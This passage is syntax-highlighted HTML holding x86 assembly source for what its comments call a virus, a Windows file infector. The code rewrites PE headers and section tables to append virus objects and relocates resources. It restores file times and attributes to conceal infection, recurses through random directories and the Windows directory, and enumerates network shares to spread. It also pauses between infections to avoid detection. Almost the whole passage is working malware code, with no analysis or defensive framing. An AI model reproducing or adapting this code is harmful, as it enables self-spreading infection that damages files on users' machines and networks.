        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">pe_begin</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">; correct image size</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">pe_begin</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc2">3h</span><span class="sc0">    </span><span class="sc1">; number of virus objects</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r_point</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; pointer to resources object</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; resource size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">pe_begin</span><span class="sc4">+</span><span class="sc2">8ch</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">pe_begin</span><span class="sc4">+</span><span class="sc2">88h</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0"> </span><span class="sc1">; zero resurce RVA by default</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; resources length 0?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">no_resources</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">88h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; resource RVA</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">pe_begin</span><span class="sc4">+</span><span class="sc2">88h</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">  </span><span class="sc1">; set resources pointer</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">pe_begin</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; number of objects</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; on resources object</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,(</span><span class="sc5">pe_begin</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0f8h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">28h</span><span class="sc4">))</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">028h</span><span class="sc0">                        </span><span class="sc1">; copy resources object</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; on beginning of file</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">28h</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc2">4000h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">28h</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; object virtual size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc2">1000h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0fffff000h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0f8h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">28h</span><span class="sc4">))</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; to image size</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">28h</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; physical offset of resources</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rsrs_change</span><span class="sc0">                     </span><span class="sc1">; change those</span><span class="sc0">

</span><span class="sc5">no_resources</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">                 </span><span class="sc1">; unmap view of file</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">has_infected</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; good infection, so a pause</span><span class="sc0">
                                                </span><span class="sc1">; will occour</span><span class="sc0">
</span><span class="sc5">close_map_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">v_map_handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0">                     </span><span class="sc1">; close mapping handle</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">f_handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">f_wtime</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">f_atime</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">f_ctime</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetFileTime</span><span class="sc0">             </span><span class="sc1">; restore original file time</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">not_to_infect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; file handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0">             </span><span class="sc1">; close infected file</span><span class="sc0">

</span><span class="sc5">error_opening</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">f_attrib</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; restore old attributes to file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_path</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetFileAttributesA</span><span class="sc0">

</span><span class="sc5">error_attributes</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">wait_time</span><span class="sc0">           </span><span class="sc1">; so it won't work too much</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">has_infected</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_infection</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">sleep_time</span><span class="sc0">          </span><span class="sc1">; if a file was infected then make a</span><span class="sc0">
                                        </span><span class="sc1">; longer pause</span><span class="sc0">
</span><span class="sc5">no_infection</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Sleep</span><span class="sc0">                   </span><span class="sc1">; pause until next one</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">has_infected</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; reset infection mark</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fsearch</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ff_handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindNextFileA</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; no more files?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">end_file_search</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">infect_file</span><span class="sc0">                     </span><span class="sc1">; else infect</span><span class="sc0">

</span><span class="sc5">end_file_search</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetTickCount</span><span class="sc0">                    </span><span class="sc1">; should we go deeper in dir</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                           </span><span class="sc1">; from actual position?</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">next_phase</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">path_position</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; search from last dir fwd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">' .*'</span><span class="sc0">           </span><span class="sc1">; to search dirs and such</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fsearch</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_path</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindFirstFileA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ff_handle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">next_phase</span><span class="sc0">                      </span><span class="sc1">; no dirs in here</span><span class="sc0">

</span><span class="sc5">check_dir</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">f_attrib</span><span class="sc4">],</span><span class="sc2">10h</span><span class="sc0">        </span><span class="sc1">; is a directory?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">search_next_dir</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">f_name</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">           </span><span class="sc1">; not . or ..</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">search_next_dir</span><span class="sc0">

        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                           </span><span class="sc1">; select randomly if walk into</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">search_next_dir</span><span class="sc0">                 </span><span class="sc1">; this or try another</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">path_position</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; put after actual search path</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">f_name</span><span class="sc0">               </span><span class="sc1">; point to directory name</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">copy_from_eax</span><span class="sc0">
</span><span class="sc5">search_next_dir</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fsearch</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ff_handle</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; search next</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindNextFileA</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; no more directoryes?</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">check_dir</span><span class="sc0">

</span><span class="sc5">next_phase</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">virus_phase</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">virus_phase</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; phases finished</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">farewell_and_goodnight</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                  </span><span class="sc1">; search in ..</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">search_dotdot</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">                  </span><span class="sc1">; windows directory phase</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">network_work</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_path</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">104h</span><span class="sc0">                    </span><span class="sc1">; buffer lenght</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">; search in windoze directory</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">copy_and_gosearch</span><span class="sc0">

</span><span class="sc5">search_dotdot</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dotdot_mask</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">copy_and_gosearch</span><span class="sc0">

</span><span class="sc5">network_work</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">find_resource</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">enum_handle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; pointer to NETSOURCE structure to use</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                         </span><span class="sc1">; CONNECTABLE | CONTAINER</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                         </span><span class="sc1">; RESOURCETYPE_DISK</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                         </span><span class="sc1">; RESOURCE_GLOBALNET</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WNetOpenEnumA</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; 0 = NO_ERROR</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">next_phase</span><span class="sc0">                      </span><span class="sc1">; on error just skip this phase</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">orig_virus_p</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; pointer to heap</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">exesize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">read_exe</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">; after other data</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">enum_count</span><span class="sc4">],</span><span class="sc2">1ffh</span><span class="sc0">     </span><span class="sc1">; get max entryes</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">enum_size</span><span class="sc0">                </span><span class="sc1">; avaiable memory for results</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; where to place results</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">enum_count</span><span class="sc0">               </span><span class="sc1">; how many to enumerate</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">enum_handle</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; handle of enumeration</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WNetEnumResourceA</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; 0 = NO_ERROR</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">next_phase</span><span class="sc0">                      </span><span class="sc1">; if some error skip</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">enum_count</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; number of entryes got</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetTickCount</span><span class="sc0">                    </span><span class="sc1">; random</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">                         </span><span class="sc1">; lenght of one entry</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; select which one</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">         </span><span class="sc1">; is an usable resource</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">find_resource</span><span class="sc0">
                                                </span><span class="sc1">; if not should be a container</span><span class="sc0">
                                                </span><span class="sc1">; (local or remote) so continue</span><span class="sc0">
                                                </span><span class="sc1">; to next level</span><span class="sc0">

</span><span class="sc5">got_resource</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; here it is</span><span class="sc0">

</span><span class="sc5">copy_and_gosearch</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_path</span><span class="sc0">
</span><span class="sc5">copy_from_eax</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; path to network or dir</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; where to copy</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lstrcpy</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">loop_searchzero</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">got_null_termination</span><span class="sc0">            </span><span class="sc1">; find end</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">loop_searchzero</span><span class="sc0">
</span><span class="sc5">got_null_termination</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'\'              ; add \
</span><span class="sc13">        inc     eax
</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">path_position</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

